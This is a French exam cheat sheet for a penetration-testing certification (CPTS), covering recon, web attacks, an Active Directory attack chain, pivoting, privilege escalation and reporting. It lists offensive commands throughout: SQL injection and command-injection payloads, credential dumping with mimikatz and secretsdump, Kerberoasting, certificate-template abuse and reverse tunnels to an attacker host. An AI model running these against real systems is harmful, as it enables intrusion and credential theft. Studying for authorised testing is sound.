# CPTS — Fiche Exam (synthèse opérationnelle)

> 10 jours de test + rapport. Objectif : **prouver l'impact**, pas seulement obtenir un shell.
> Usage : relire la veille et le matin de l'exam. Chaque bloc = ce que tu fais quand tu bloques.

---

## 0. Les 5 règles de l'exam

1. **Enum avant exploit.** 80 % des blocages = enumeration incomplète.
2. **Note tout en direct.** Commande + sortie + heure. Le rapport se construit pendant, pas après.
3. **Timebox : 60–90 min par piste.** Pas de tunnel. Note l'impasse et change d'angle.
4. **Réutilise chaque credential** partout (spray, PtH, SSH, web, DB).
5. **Scope strict.** Chaque nouvelle IP découverte = noter + vérifier qu'elle est dans le scope.

```
Timeline type : J1-J2 externe | J3-J5 interne/pivot | J6-J8 AD | J9 preuves | J10 rapport
```

---

## 1. Premier contact avec une cible

```bash
# 1. Toujours en premier
sudo nmap -p- --min-rate 5000 -T4 -oA scans/all_<IP> <IP>
sudo nmap -sCV -p<PORTS> -oA scans/svc_<IP> <IP>
sudo nmap -sU --top-ports 50 <IP>

# 2. Si hostname/domaine connu
echo "<IP> <DOMAIN>" | sudo tee -a /etc/hosts

# 3. Si web
whatweb -a3 http://<IP>; curl -I http://<IP>
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403
```

## 2. Matrice port → attaque

| Port | Service | Première action |
|---|---|---|
| 21 | FTP | anonymous, `ftp> ls -la`, vsftpd 2.3.4 backdoor |
| 22 | SSH | creds, clé trouvée, CVE-2024-6387 (regreSSHion) |
| 25/587 | SMTP | `VRFY`, enum users, relay |
| 53 | DNS | AXFR, sous-domaines |
| 80/443 | HTTP | ffuf + whatweb + source + robots.txt |
| 111 | rpcbind | `showmount -e` |
| 139/445 | SMB | `netexec smb -u '' -p '' --shares`, null session, EternalBlue si 2008/Win7 |
| 1433 | MSSQL | `impacket-mssqlclient`, `xp_cmdshell`, `EXEC xp_dirtree` (capture hash) |
| 2049 | NFS | `showmount -e`, `no_root_squash` → SUID |
| 3306 | MySQL | root sans mdp, `INTO OUTFILE` → webshell |
| 3389 | RDP | creds, BlueKeep |
| 5985/5986 | WinRM | `evil-winrm`, `netexec winrm` |
| 6379 | Redis | `INFO`, `CONFIG SET dir` + `dbfilename` → RCE |
| 8080+ | Tomcat/Jenkins | manager, scripts, Groovy console |
| 27017 | MongoDB | sans auth → dump |

## 3. Arbre de décision Web

```
Login form      → SQLi (' OR 1=1-- -) → sqlmap → creds → réutilisation
Paramètre ?id=  → SQLi / LFI / SSRF / IDOR / SSTI
Upload          → bypass extension (.php5 .phtml .phar), Content-Type, magic bytes, double ext
?page=          → LFI → /etc/passwd → log poisoning → RCE
?cmd=           → command injection (;, |, &&, $(), backticks, ${IFS})
Reflected param → XSS → cookie admin → vol de session
/api/v1/user/2  → IDOR → changer l'id
Subdomain       → vhost fuzzing : ffuf -H "Host: FUZZ.<DOMAIN>"
```

```bash
# Fuzz rapide multi-extension
ffuf -u http://<TARGET>/FUZZ -w .../raft-medium-files.txt -e .php,.bak,.old,.txt,.zip
# Vhost
ffuf -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -w subdomains.txt -fs <TAILLE_DEFAUT>
```

## 4. Shell → premier réflexe

```bash
# Linux
id; sudo -l; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null; ls -la /etc/cron*; cat /etc/crontab
./linpeas.sh -a | tee /tmp/lp.txt

# Windows
whoami /all; systeminfo; net user; net localgroup administrators
cmdkey /list; reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
.\winPEASx64.exe
```

## 5. Chaîne AD (cœur de la note)

```
1. Enum sans creds
   netexec smb <DC> -u '' -p '' --users --shares        # null session
   impacket-GetNPUsers <DOMAIN>/ -usersfile u.txt -dc-ip <DC> -no-pass   # AS-REP roast

2. Avec un compte
   bloodhound-python -u <U> -p <P> -d <DOMAIN> -ns <DC> -c All
   netexec smb <DC> -u <U> -p <P> --groups --loggedon-users --pass-pol

3. Kerberoast
   impacket-GetUserSPNs <DOMAIN>/<U>:<P> -dc-ip <DC> -request
   hashcat -m 13100 spn.txt rockyou.txt

4. ACL (BloodHound → Outbound Object Control)
   GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword
   impacket-dacledit -action write -rights FullControl -principal <U> -target-dn "..." <DOMAIN>/<U>:<P>
   impacket-owneredit / impacket-pass-the-hash ...

5. ADCS
   certipy-ad find -u <U>@<DOMAIN> -p <P> -dc-ip <DC> -vulnerable -stdout
   ESC1: certipy-ad req -u <U>@<DOMAIN> -p <P> -ca <CA> -template <TPL> -upn administrator@<DOMAIN>
         certipy-ad auth -pfx administrator.pfx -dc-ip <DC>

6. Délégations
   Unconstrained → printerbug/coerce + capture TGT
   Constrained → S4U2Self/S4U2Proxy (impacket-getST)
   RBCD → addcomputer + rbcd.py

7. Objectif final
   impacket-secretsdump <DOMAIN>/<U>:<P>@<DC> -just-dc-ntlm
   → hash krbtgt + Administrator → Golden Ticket → preuve
```

## 6. Pivots (le plus fréquent en exam)

```bash
# Chisel (le plus fiable)
# cible : ./chisel client <LHOST>:8080 R:socks
# nous   : ./chisel server -p 8080 --reverse
# puis   : proxychains4 -q nxc smb 172.16.5.0/24 -u <U> -p <P>

# Ligolo-ng (plus rapide, interface tun)
# cible : ./agent -connect <LHOST>:11601 -ignore-cert
# nous   : sudo ./proxy -selfcert ; session ; iface create tun0 ; start

# SSH (si creds)
ssh -D 1080 -N -f <USER>@<PIVOT>
ssh -L 8080:127.0.0.1:80 <USER>@<PIVOT>
```

## 7. Privesc — top 10 Linux

```bash
sudo -l                       # GTFOBins, LD_PRELOAD, CVE-2021-3156
find / -perm -4000 2>/dev/null # SUID → GTFOBins
getcap -r / 2>/dev/null        # cap_setuid → python
crontab / /etc/cron*           # script writable → root
pspy64                         # observer les jobs root
PATH hijack                    # service sans chemin absolu
NFS no_root_squash             # SUID via partage
docker group                   # mount / → chroot
kernel CVE                     # DirtyPipe, PwnKit
secrets                        # historique, configs, id_rsa
```

## 8. Privesc — top 10 Windows

```cmd
whoami /priv                  :: SeImpersonate → PrintSpoofer/GodPotato
wmic service get name,pathname,startmode  :: unquoted path
accesschk -uwcqv "Users" *    :: service modifiable
schtasks /query /fo LIST /v   :: tâche writable
reg query ...AlwaysInstallElevated  :: msi SYSTEM
cmdkey /list                  :: creds enregistrés
mimikatz sekurlsa::logonpasswords
secretsdump                   :: dump distant
PowerUp / winPEAS             :: tout-en-un
unattend.xml / web.config     :: creds en clair
```

## 9. Ce qui rapporte des points

| Action | Points |
|---|---|
| Shell user sur une machine | oui |
| Escalade admin/root + preuve | oui |
| DA / accès DC | beaucoup |
| Chaîne documentée (narrative) | beaucoup |
| Preuves horodatées et reproductibles | obligatoire |
| Shell sans preuve | ~0 |

**Preuve minimale** : `hostname; whoami; ipconfig/ifconfig` + `type C:\Users\Administrator\Desktop\proof.txt` / `cat /root/proof.txt`, capture d'écran + fichier texte.

## 10. Rapport express (structure imposée)

```
1. Cover (client, dates, version, classification)
2. Executive Summary (1 page, langage métier)
3. Scope & Rules of Engagement
4. Methodology (PTES / MITRE)
5. Attack Narrative (le chemin complet, chronologique)
6. Findings (1 fiche par vuln : titre, CVSS, preuve, impact, remédiation)
7. Recommendations (priorisées)
8. Annexes (outils, timeline, preuves brutes)
```

Finding minimal :
```markdown
## F-0X — <Titre>
Sévérité : Critical (CVSS 9.8) | Actif : <IP>
Description : ...
Preuve : commande + sortie + capture
Impact : ...
Remédiation : ...
```

## 11. Checklist J-1

- [ ] Notes de tous les labs rangées dans un dossier
- [ ] Templates de rapport prêts (SysReptor ou markdown)
- [ ] Wordlists locales vérifiées
- [ ] Scripts perso testés (privesc, pivots)
- [ ] VPN/connexion testée
- [ ] Sommeil + eau + pas de nouveau tool la veille
